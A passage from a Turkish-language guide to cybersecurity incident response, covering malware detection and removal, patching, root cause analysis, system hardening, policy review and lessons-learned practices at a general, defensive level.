Kötü amaçlı yazılımın tespiti, sistemdeki anormal aktiviteleri, şüpheli dosya ve süreçleri izleyerek gerçekleştirilir. Çeşitli güvenlik araçları (örneğin, antivirüs yazılımları, EDR/EDR araçları) ve günlük (log) analizleri kullanılarak kötü amaçlı yazılım tespit edilebilir.

**Ağırlıklı İpuçları:**

- Beklenmedik ağ bağlantıları
- Anormal sistem performansı
- Yüksek CPU ve bellek kullanımı
- Tanınmayan ya da şüpheli dosyalar

#### **2. Malware Removal (Kötü Amaçlı Yazılımın Kaldırılması)**

Kötü amaçlı yazılım tespit edildikten sonra, etkili bir şekilde sistemden temizlenmesi gerekir. Bu işlem, kötü amaçlı yazılımın türüne göre değişebilir ve manuel müdahale ya da otomatik araçlar ile yapılabilir.

**Araçlar ve Yöntemler:**

- **Antivirüs Yazılımları:** Sistemdeki virüsleri, trojanları ve diğer zararlı yazılımları temizler.
- **Manual Temizlik:** Kötü amaçlı yazılımın izleri silinir, şüpheli dosyalar manuel olarak kaldırılır.
- **Yedekleme ve Geri Yükleme:** Temizlenmesi zor olan kötü amaçlı yazılımlar için sistem yedeği geri yüklenebilir.

#### **3. Increasing System Security (Sistem Güvenliğini Artırma)**

Malware sonrası sistem güvenliğinin arttırılması, olası saldırıları önlemek için önemlidir. Bu adımda, sistemin zayıf noktaları güçlendirilir.

**Yöntemler:**

- **Şifre Güvenliği:** Güçlü şifre politikaları uygulanır.
- **Yetkilendirme ve Erişim Kontrolü:** Yetkisiz erişimler engellenir.
- **Güvenlik Duvarı ve Ağ İzleme:** Gelişmiş güvenlik duvarları ve ağ izleme araçları kullanılır.

#### **4. Applying Hotfix Patches (Sıcak Yama Uygulama)**

Bilinen güvenlik açıklarına karşı yamalar (patches) uygulamak, sistemin savunmalarını güçlendirir. Sıcak yamalar, hızlıca sistemin güvenliğini sağlamak amacıyla kullanılan acil düzeltmeler olup, genellikle yazılımın zayıf noktalarına müdahale eder.

**Yama Yönetimi:**

- **Yama Uygulama:** Güvenlik açıklarını kapatmak için güncel yamalar uygulanır.
- **Güncelleme Yönetimi:** Yazılım ve işletim sistemi sürekli olarak güncel tutulur.
- **Sistem Kontrolleri:** Yamanın başarıyla uygulandığını doğrulamak için sistem kontrol edilir.

### **Remediation (İyileştirme)**

Remediation, bir güvenlik olayının sonrasında yapılan, saldırının tekrarlanmasını engellemeye yönelik uzun vadeli düzeltici eylemleri içerir. Bu süreç, sadece kötü amaçlı yazılımın temizlenmesiyle kalmaz, aynı zamanda sistemin güçlendirilmesi ve organizasyonel güvenlik önlemlerinin gözden geçirilmesini de kapsar.

#### **1. Root Cause Analysis (Kök Neden Analizi)**

Root Cause Analysis (RCA), bir güvenlik olayının temel sebebinin belirlenmesi sürecidir. Bu, bir saldırının veya güvenlik ihlalinin neden gerçekleştiğini anlamaya yardımcı olur ve gelecekte benzer olayların yaşanmasının önüne geçer.

**Yöntemler:**

- **Log ve Olay Analizi:** Tüm sistem logları detaylıca incelenir. Kötü amaçlı yazılımın nasıl ve hangi açığı kullanarak sisteme girdiği anlaşılır.
- **Zayıf Nokta Tespiti:** Sistem ve ağ üzerinde yapılan güvenlik açığı taramaları ile zayıf noktalar belirlenir.
- **İzleme ve Raporlama:** Zafiyetlerin kaynağı bulunarak, saldırıların izlediği yollar tespit edilir.
- **Sosyal Mühendislik:** İnsan hatalarından kaynaklanan saldırılar varsa, kullanıcı eğitimi ve bilinçlendirme önlemleri alınır.

#### **2. Strengthening Systems and Applications (Sistem ve Uygulamaların Güçlendirilmesi)**

Bir güvenlik olayının ardından sistemlerin daha güvenli hale getirilmesi, gelecekteki saldırılara karşı daha dirençli olmalarını sağlar. Bu adım, tehditlerin tekrar etmeyeceği bir ortam oluşturmak için kritik öneme sahiptir.

- **Güvenlik Duvarları ve Ağ İzleme:** Güvenlik duvarları güncellenir ve ağ trafiği sürekli izlenir.
- **Uygulama Güvenliği:** Uygulamalarda bulunan zafiyetler düzeltilir, yeni güvenlik yamaları uygulanır. Güvenli yazılım geliştirme süreçleri güçlendirilir.
- **Erişim Kontrolleri ve Kimlik Doğrulama:** Kullanıcı hakları ve erişim seviyeleri gözden geçirilir, çok faktörlü kimlik doğrulama (MFA) uygulanır.
- **Yedekleme ve Kurtarma Planları:** Yedekleme süreçleri gözden geçirilir ve felaket kurtarma planları hazırlanır.

#### **3. Review of Security Policies and Procedures (Güvenlik Politikaları ve Prosedürlerinin Gözden Geçirilmesi)**

Saldırı sonrası güvenlik politikaları ve prosedürlerinin gözden geçirilmesi, organizasyonun daha güvenli bir hale gelmesini sağlar. Bu süreç, çalışanların güvenlik prosedürlerine uyumu ve olaylara nasıl müdahale edileceğini netleştirir.

- **Politika ve Prosedür Gözden Geçirme:** Şirketin güvenlik politikaları, prosedürleri ve olay müdahale planları yeniden gözden geçirilir. Gerekirse, güncellenir.
- **Eğitim ve Farkındalık:** Çalışanlar için güvenlik bilinci eğitimi verilir ve organizasyona yönelik güvenlik kültürü oluşturulur.
- **Sürekli İzleme ve İyileştirme:** Güvenlik süreçlerinin ve araçlarının etkinliği düzenli olarak değerlendirilir. Sürekli iyileştirme yaklaşımı uygulanır.

### **Lessons Learned (Alınan Dersler)**

Siber güvenlik olaylarının ardından, **Lessons Learned** (Alınan Dersler) süreci, yapılan hataların ve başarıların analiz edilerek organizasyonun gelecekteki olası saldırılara daha iyi hazırlanmasını sağlamayı hedefler. Bu süreç, bir olayın sadece çözülmesiyle bitmez, aynı zamanda uzun vadeli güvenlik stratejilerinin geliştirilmesine yardımcı olur.

#### **1. Post Incident Investigation (Olay Sonrası Soruşturma)**

Olay sonrası soruşturma, güvenlik olayını analiz etme ve anlamaya yönelik yapılacak ilk adımdır. Bu aşama, saldırının nasıl gerçekleştiğini, hangi yöntemlerin kullanıldığını ve hangi zafiyetlerin hedef alındığını belirlemeyi amaçlar.

- **Zafiyetlerin ve Taktiklerin Tespiti:** Saldırganın kullandığı teknikler, taktikler ve prosedürler (TTPs) araştırılır. Olayın hangi aşamalarda tespit edilmediği ve ne zaman müdahale edilmesi gerektiği belirlenir.
- **Saldırı Vektörlerinin Belirlenmesi:** Hangi yollarla sisteme giriş yapıldığı (örneğin, phishing, güvenlik açığı kullanımı) ve bu yolların nasıl engellenebileceği analiz edilir.
- **Ekip Performansı ve Zaman Yönetimi:** Müdahale sürecindeki ekiplerin performansı gözden geçirilir. Kriz anında müdahale süreleri ve karar alma süreçleri analiz edilir.

#### **2. Documentation (Dokümantasyon)**

Olay sonrası tüm süreçlerin detaylı bir şekilde belgelenmesi, gelecekteki olaylarla daha etkili bir şekilde başa çıkmak için gereklidir. Bu dokümantasyon, yalnızca mevcut olayı değil, aynı zamanda şirketin nasıl iyileştirilebileceğine dair önerileri de içerir.

- **Olay Kayıtları ve Raporlama:** Saldırının başladığı andan itibaren tüm olaylar, müdahale adımları, kullanılan araçlar ve alınan aksiyonlar kayıt altına alınır.
- **Zayıf Noktalar ve Güvenlik Açıkları:** Olayın neden olduğu zafiyetler belgelenir ve bu açıkların gelecekte nasıl kapatılacağına dair öneriler eklenir.
- **İletişim ve Koordinasyon:** Ekip içi ve dışı iletişim süreçleri yazılı hale getirilir. İletişim hataları, gecikmeler ve etkin olmayan yönlendirmeler analiz edilir.

#### **3. Implementation of Suggested Improvements (Önerilen İyileştirmelerin Uygulanması)**

Olay sonrasında, olaydan alınan dersler ışığında güvenlik altyapısını güçlendirmek için iyileştirmeler yapılır. Bu iyileştirmeler yalnızca teknik çözümleri değil, aynı zamanda organizasyonel değişiklikleri de içerir.

- **Güvenlik Araçlarının Güncellenmesi:** Kullanılan güvenlik araçları, tehdit istihbarat sistemleri ve saldırı tespit yazılımları gözden geçirilir ve geliştirilir. Gerektiğinde yeni araçlar eklenir.
- **Eğitim ve Bilinçlendirme:** Çalışanlara yönelik sürekli güvenlik eğitim programları oluşturulur. Eğitimlerin kapsamı, son saldırıdan alınan dersler doğrultusunda genişletilir.
- **Politika ve Prosedür Güncellemeleri:** Güvenlik politikaları ve prosedürleri, olayın getirdiği yeni tehditler ışığında gözden geçirilir ve güncellenir. Acil müdahale prosedürleri, olay sonrası raporlama ve izleme süreçleri detaylandırılır.
- **Teknik İyileştirmeler:** Sistem güncellemeleri, yamanın uygulanması, erişim kontrol politikalarının gözden geçirilmesi ve güçlü şifreleme gibi teknik iyileştirmeler yapılır.
